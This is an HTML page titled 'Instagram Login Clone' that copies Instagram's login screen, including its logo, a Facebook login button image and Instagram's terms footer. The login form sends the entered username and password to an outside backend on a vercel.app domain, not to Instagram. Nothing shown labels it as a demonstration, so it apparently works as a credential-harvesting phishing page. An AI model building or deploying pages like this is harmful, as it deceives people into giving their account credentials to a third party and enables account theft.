<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <!-- Ensures the page is mobile-friendly -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram Login Clone</title>
  <!-- Link to external CSS file -->
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <!-- Main container for the login page -->
  <div class="container">
    <!-- Instagram Logo Image -->
    <div class="logo-wrapper">
      <!-- Replace the src with your actual logo image URL -->
      <img src="https://i.ibb.co/Nn94TyNh/image.png" alt="Instagram" class="logo-image" />
    </div>
    <!-- Facebook Login Button (Image) -->
    <!-- The link points to your Vercel endpoint for Facebook login -->
    <a href="https://your-vercel-app.vercel.app/api/facebook-login" class="fb-login-link">
      <img
        src="https://i.ibb.co/xKvqws1c/image.png"
        alt="Continue Using Facebook"
        class="fb-button-image"
      />
    </a>
    <!-- OR Separator -->
    <div class="or-container">
      <div class="line"></div>
      <div class="or-text">OR</div>
      <div class="line"></div>
    </div>
    <!-- Login Form -->
    <!-- Form action points to your Vercel backend endpoint -->
  <form action="https://backend-indol-seven-47.vercel.app/api/login" method="POST">

      <input type="text" name="username" placeholder="Phone number, username or email address" required />
      <input type="password" name="password" placeholder="Password" required />
      <!-- Forgot Password Link -->
      <a href="https://your-vercel-app.vercel.app/api/forgot-password" class="forgot-password">Forgotten your password?</a>
      <!-- Log in Button -->
      <!-- Button uses a name "action" with value "login" so the backend knows which button was pressed -->
      <button type="submit" class="login-btn" name="action" value="login">Log in</button>
    </form>
    <!-- Sign Up Prompt -->
    <div class="signup-box">
      <p>
        Don't have an account?
        <a href="https://your-vercel-app.vercel.app/api/signup">Sign up</a>
      </p>
    </div>
    <!-- Footer -->
    <div class="footer">
      <p>
        By continuing, you agree to Instagram's
        <a href="#">Terms of Use</a> and
        <a href="#">Privacy Policy</a>.
      </p>
    </div>
  </div>
  <!-- Link to external JavaScript file (if needed) -->
  <script src="script.js"></script>
</body>
</html>
